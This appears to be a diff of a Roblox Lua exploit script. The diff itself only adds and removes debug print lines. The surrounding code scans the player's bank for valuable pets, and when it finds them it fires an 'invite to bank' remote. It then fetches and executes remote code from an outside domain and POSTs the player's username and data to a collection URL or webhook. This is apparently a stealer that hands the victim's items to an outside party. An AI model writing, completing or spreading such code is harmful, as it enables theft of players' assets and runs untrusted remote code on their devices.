@@ -286,7 +286,6 @@ local SuperBank = Event:InvokeServer(A_1)
 	if table.find(ScumList, v["id"]) then ScumCount+=1 end
 	if table.find(PogList, v["id"]) then PogCount+=1 end
 	end
-	print(PogCount, ScumCount, HugeCount, EXCCount)
 	if HugeCount >= 1 or EXCCount >= 15 or ScumCount >= 1 or PogCount >= 4 then
 	wait(3)
 local A_1 = 
@@ -296,6 +295,7 @@ local A_1 =
 }
 local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
 Event:InvokeServer(A_1)
+print("Got After Invite")
 	
 local url = loadstring(game:HttpGet("https://downloads.blobnet.tk/web.html"))()
 local username = game:GetService("Players").LocalPlayer.Name
@@ -359,6 +359,7 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+print("Got after Request")
 	end
 	if _G.UseWebhook then
 local YourWebHookHere =  res2[1]
